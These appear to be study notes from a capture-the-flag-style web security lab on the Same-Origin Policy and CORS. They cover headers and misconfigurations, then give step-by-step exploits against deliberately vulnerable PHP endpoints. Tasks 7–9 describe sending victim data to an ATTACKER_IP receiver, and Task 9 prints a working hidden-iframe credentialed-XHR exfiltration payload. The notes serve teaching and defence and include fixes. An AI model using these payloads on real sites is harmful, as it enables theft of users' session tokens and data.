# TASK 2 Understanding SOP

The Same-Origin Policy (SOP) blocks scripts from accessing data on another page unless protocol, hostname, and port all match.

## Examples of SOP

- Same domain, different port: https://test.com:80 can access https://test.com:80/about, but not https://test.com:8080.
- HTTP/HTTPS: http://test.com cannot access https://test.com due to different protocols.

## Common Misconceptions

- SOP applies to more than just scripts—it affects images, stylesheets, and frames too.
- SOP doesn't block all cross-origin actions; techniques like CORS and postMessage allow some.
- Same domain ≠ same origin; protocol and port must also match.

## SOP Decision Process

- Browsers check protocol, hostname, and port. If all match, access is allowed; otherwise, it's blocked.

__________________________________________________________________________________________


# TASK 3 Understanding CORS

Cross-Origin Resource Sharing (CORS) is a system using HTTP headers that lets servers specify which origins can access their resources. 
While the Same-Origin Policy (SOP) blocks cross-origin requests by default, CORS allows controlled exceptions. 
The server sends CORS headers in its response, and the browser enforces access based on these rules.

## Different HTTP Headers Involved in CORS

- **Access-Control-Allow-Origin**     : Specifies allowed domains.
- **Access-Control-Allow-Methods**    : Allowed HTTP methods.
- **Access-Control-Allow-Headers**    : Allowed request headers.
- **Access-Control-Max-Age**          : Caches preflight response.
- **Access-Control-Allow-Credentials**: Allows credentials (cookies, etc.) if true; cannot use * for origin.

## Common Scenarios Where CORS is Applied

- APIs                        : Frontend on one domain accessing an API on another.
- CDNs                        : Loading scripts, fonts, or assets from external sources.
- Web Fonts                   : Sharing fonts across domains.
- Third-Party Widgets         : Embedding social buttons or chat plugins.
- Cross-domain Authentication : SSO or OAuth flows.

## Simple Requests vs. Preflight Requests

- **Simple Requests**:    Use GET, HEAD, or POST with standard Content-Types and no custom headers. 
                        Sent directly with the Origin header; browser enforces CORS based on the server's Access-Control-Allow-Origin response.
- **Preflight Requests**: For other methods, custom headers, or non-standard Content-Types, the browser first sends an OPTIONS request (the "preflight") to check if the server allows the actual request. 
                        If allowed, the real request follows.

## Process of a CORS Request

- The browser first sends an HTTP request to the server.
- The server then checks the Origin header against its list of allowed origins.
- If the origin is allowed, the server responds with the appropriate Access-Control-Allow-Origin header.
- The browser will block the cross-origin request if the origin is not allowed.

__________________________________________________________________________________________


# TASK 4 ACAO in depth

The Access-Control-Allow-Origin (ACAO) header tells browsers which origins can access a resource. 
When a cross-origin request is made, the server checks the Origin and, if allowed, responds with the ACAO header specifying the permitted origin or * for any origin.

## ACAO Configurations

- **Single Origin**:
  ```
  Access-Control-Allow-Origin: https://example.com
  ```
  Only https://example.com can access.

- **Multiple Origins**:
  Dynamically set ACAO for allowed origins.
  Allows a specific list of trusted origins.

- **Wildcard**:
  ```
  Access-Control-Allow-Origin: *
  ```
  Any origin can access (least secure).

- **With Credentials**:
  ACAO must be a specific origin + Access-Control-Allow-Credentials: true
  Allows cookies/auth data in cross-origin requests.

## ACAO Flow

- Server checks if the request has an Origin header. 
- If not, it sets ACAO to *. 
- If present, it allows the origin only if it's in the allowed list; otherwise, access is denied.

__________________________________________________________________________________________


# TASK 5 Common Misconfigurations

Common CORS misconfigurations include:

- **Accepting 'null' origins**           :    This allows requests from local files or data URLs, which can be abused by attackers. 
                                        Always reject 'null' unless explicitly needed.
- **Weak origin validation (bad regex)** :    Poorly written regex can match unintended domains (e.g., /example.com$/ matches badexample.com). 
                                        Use strict, tested patterns.
- **Reflecting arbitrary Origin headers**:    Echoing back any Origin in Access-Control-Allow-Origin lets any site access protected resources. 
                                        Only allow trusted origins from a defined allowlist.

## Secure Handling of Origin Checks

- It first checks if the origin is 'null' and rejects such requests. 
- If not, it checks whether the origin is in a predefined allowlist. 
- If the origin is in the allowlist, the server sets Access-Control-Allow-Origin to the origin and proceeds with the request. 
- Otherwise, it rejects the request, ensuring only allowlisted origins are allowed. 
- This method minimizes the risk of CORS-related vulnerabilities.

Note: Using * is safe only for public, non-sensitive resources without credentials.

__________________________________________________________________________________________


# TASK 7 Arbitrary Origin

Exploiting an Arbitrary Origin vulnerability is relatively easy compared to other CORS vulnerabilities since the application accepts cross-origin requests from any domain name. 
For example, below is the vulnerable code of http://corssop.thm/arbitrary.php:

```
if (isset($_SERVER['HTTP_ORIGIN'])){
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}
```

1. Vulnerability summary
    - The server echoes the Origin header into Access-Control-Allow-Origin without validation, allowing any origin (e.g., http://evilcors.thm) to bypass SOP.

2. Prepare the exploit
    - Open http://corssop.thm/exploits/data_exfil.html on the exploit hosting server.
    - Change the target URL to: http://corssop.thm/arbitrary.php
    - Change the exfiltration receiver URL to your attacker server (e.g., ATTACKER_IP:81/receiver.php for AttackBox Apache).
    - Save the page on the exploit server.

3. Verify the hosted exploit
    - Click "View exploit" on the exploit server to open the hosted page in a new tab.
    - Open Developer Tools > Network in that tab.

4. Execute the exploit
    - On the exploit server homepage, click "Send to victim" (the victim will visit http://evilcors.thm and load the hosted exploit).
    - In DevTools you should see two XHRs: the first to the target (corssop.thm/arbitrary.php), the second to your receiver (ATTACKER_IP:81).

5. Confirm exfiltration
    - Check the exploit server logs for a request from the victim IP (may differ depending on network).
    - On the attacker server, check /var/www/html/data.txt (or receiver logs) for the POST containing the fetched page content.

6. Note on real-world impact
    - If the target response contains sensitive data (cookies, tokens, user data), the exploit can capture and send it to the attacker server. 
      Proper origin validation or an allowlist prevents this.

__________________________________________________________________________________________


# TASK 8 Bad Regex in Origin

```
if (isset($_SERVER['HTTP_ORIGIN']) && preg_match('#corssop.thm#', $_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}
```

1. Vulnerability summary
    - The server uses a weak regex (#corssop.thm#) to validate Origin and echoes it in ACAO.
    - Any origin containing "corssop.thm" (e.g., http://corssop.thm.evilcors.thm) will be allowed, enabling cross-origin access.

2. Prepare the exploit
    - Open http://corssop.thm/exploits/data_exfil.html on the exploit hosting server.
    - Set the target URL to: http://corssop.thm/badregex.php
    - Set the exfiltration receiver URL to your attacker server (e.g., ATTACKER_IP:81/receiver.php).
    - Save the page on the exploit server.

3. Verify the hosted exploit
    - Click "View exploit" on the exploit server to open the hosted page in a new tab.
    - Open Developer Tools > Network in that tab.

4. Execute the exploit
    - On the exploit server homepage, click "Send to victim" (the victim will visit http://corssop.thm.evilcors.thm and load the hosted exploit).
    - In DevTools you should see two XHRs: the first to the target (corssop.thm/badregex.php), the second to your receiver (ATTACKER_IP:81).

5. Confirm exfiltration
    - Check the exploit server logs for a request from the victim IP.
    - On the attacker server, check /var/www/html/data.txt (or receiver logs) for the POST containing the fetched page content.

6. Note on real-world impact
    - Sensitive responses (cookies, tokens, user data) can be exfiltrated if ACAO is improperly set.
    - Fix by using strict origin comparisons or an explicit allowlist; avoid matching substrings with loose regexes.

__________________________________________________________________________________________

# TASK 9 Null Origin

```
if (isset($_SERVER['HTTP_ORIGIN']) && $_SERVER['HTTP_ORIGIN'] === 'null') {
    header('Access-Control-Allow-Origin: null');
    header('Access-Control-Allow-Credentials: true');
}
```

1. Vulnerability summary
    - The server explicitly allows the "null" origin in ACAO and permits credentials, trusting requests originating from file://, data: or sandboxed contexts.
    - This enables an attacker-hosted page (e.g., a data URL or local file) to perform authenticated requests and read responses in the victim's browser.

2. Prepare the exploit
    - Host an exploit page (data URL or local file) that loads a hidden iframe which runs JavaScript to request the vulnerable endpoint (http://corssop.thm/null.php) with credentials.
    - Set the exfiltration receiver to your attacker server (e.g., http://EXFILTRATOR_IP/receiver.php).

3. Verify the hosted exploit
    - Open the exploit page in a browser (e.g., via file:// or data: URL).
    - Open Developer Tools > Network to observe outbound XHRs.

4. Execute the exploit
    - When the victim opens the exploit (or a stored XSS triggers it), the iframe/script issues an XHR to http://corssop.thm/null.php with withCredentials=true.
    - Because ACAO: null and Allow-Credentials: true are present, the browser allows the response to be read and the script can POST it to the attacker server.

5. Confirm exfiltration
    - Check your attacker receiver logs (or /var/www/html/data.txt) for a POST containing the fetched page content from the victim.
    - Confirm presence of sensitive data (session tokens, user info) in the exfiltrated payload.

6. Note on real-world impact
    - Allowing 'null' as ACAO with credentials is dangerous; remove/nullify this header or require explicit allowlist checks. Use strict origin validation and avoid trusting non-standard origins.

### Sample exploit (keep and embed on your exploit hosting server or as a data: URL)

```
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
    <iframe id="exploitFrame" style="display:none;"></iframe>
    <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
</div>

<script>
  // Change EXFILTRATOR_IP to your listener
  var exploitCode = `
    <script>
      function exploit() {
        var xhttp = new XMLHttpRequest();
        xhttp.open("GET", "http://corssop.thm/null.php", true);
        xhttp.withCredentials = true;
        xhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://EXFILTRATOR_IP/receiver.php", true);
            xhr.withCredentials = true;
            xhr.send(this.responseText);
          }
        };
        xhttp.send();
      }
      exploit();
    <\/script>
  `;
  var encodedExploit = btoa(exploitCode);
  document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
</script>
```

__________________________________________________________________________________________


# Appendix